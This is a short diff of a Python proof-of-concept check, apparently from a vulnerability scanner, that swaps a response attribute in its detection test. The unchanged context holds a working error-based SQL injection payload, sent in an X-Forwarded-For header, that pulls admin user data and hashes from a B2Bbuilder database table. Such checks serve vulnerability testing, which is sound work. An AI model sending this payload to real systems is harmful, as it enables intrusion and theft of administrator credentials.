@@ -53,7 +53,7 @@ class Poc(ABPoc):
                 "X-Forwarded-For": "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(c),user,0x27,0x7e) from b2bbuilder_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1"
             }
             r = s.get(url, headers=header)
-            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.content:
+            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
